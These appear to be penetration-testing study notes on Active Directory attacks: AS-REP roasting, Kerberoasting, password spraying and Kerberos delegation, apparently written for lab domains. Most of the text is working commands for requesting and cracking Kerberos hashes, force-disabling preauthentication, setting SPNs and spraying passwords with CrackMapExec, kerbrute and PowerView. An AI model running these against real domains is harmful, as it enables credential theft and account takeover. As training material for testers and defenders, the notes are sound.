### AsReproasting
__Pre-Authentication__ means sending encrypted timestamp before requesting TGT.
As-reproasting occurs when a user account has the privilege "_Does not require Pre-Authentication_" enabled. 

- Attackers can send a junk request for authentication, and the KDC will return _TGT_ for users that have Pre-Authentication disabled.
- KDC responds with the `PRINCIPAL UNKNOWN` error for invalid usernames.
- Whenever the KDC prompts for Kerberos Pre-Authentication, this means username exists.

> With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.

```bash
GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip $IP
```

```bash
kerbrute userenum --dc-ip $IP -d domain.local users.txt --downgrade
```

```bash
hashcat -m 18200 -a 0 hashes.txt passwordlist.txt -O
```

##### Windows
__AsRep not Required Users__
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
__Get AsRep Request__
```powershell
Get-ASREPHash -UserName VPN1user -Verbose
```
•
```powershell
Invoke-ASREPRoast -Verbose
```

__Force disable Kerberos Preauth__
```powershell
Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
```


---
### Kerberoasting
Domain-connected services, such as MSSQL, web servers may be connected and issued identifiers that allow Kerberos to authenticate the service account. 
- If a domain user account is compromised, then that account can request kerberoastable account names and their _TGS_
- A Kerberoastable account is one that has an SPN set.
- With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).

> In order to request SPNs, a domain account is required to make the query.


```bash
GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip $IP -request
```

```bash
hashcat -m 13100 -a 0 hashes.txt passwordlist.txt -O
```

##### Windows
```powershell
Get-DomainUser -Identity supportuser | select serviceprincipalname
```
```powershell
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```
__Force set SPN__
```powershell
Set-DomainObject -Identity support1user 
-Set @{serviceprincipalname=‘dcorp/whatever1'}
```

```powershell
Set-ADUser -Identity support1user 
-ServicePrincipalNames @{Add=‘dcorp/whatever1'}
```

---
### Password Spraying
|Tool|Ports|
|-|-|
|nmblookup|137/UDP|
|nbtstat|137/UDP|
|net|139/TCP, 135/TCP, TCP and UDP 135 and 49152-65535|
|rpcclient|135/TCP|
|smbclient|445/TCP|

__rpcclient__
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" $IP | grep Authority; done
```

__Kerbrute__
```shell-session
kerbrute passwordspray -d inlanefreight.local --dc $IP valid_users.txt  Welcome1
```

__CrackMapExec__
```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

__Local Admin Spraying__
- `--local-auth` flag will tell the tool only to attempt to _log in one time_ on each machine
```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

##### Windows

__[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)__
- Automatically generate a user list from AD, query the domain password policy, and exclude user accounts within one attempt of locking out.
```powershell
Invoke-DomainPasswordSpray -Password Spring2017
```
```powershell
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```

---
### Kerberos Unconstrained Delegation
- Kerberos Delegation allows to "reuse the end-user credentials to access resources hosted on a different server".
- This is typically useful in multi-tier service or applications where Kerberos Double Hop is required.
- For example, users authenticates to a web server and web server makes requests to a database server. The web server can request access to resources (all or some resources depending on the type of delegation) on the database server as the user and not as the web server's service account.
- Please note that, for the above example, the service account for web service must be trusted for delegation to be able to make requests as a user.

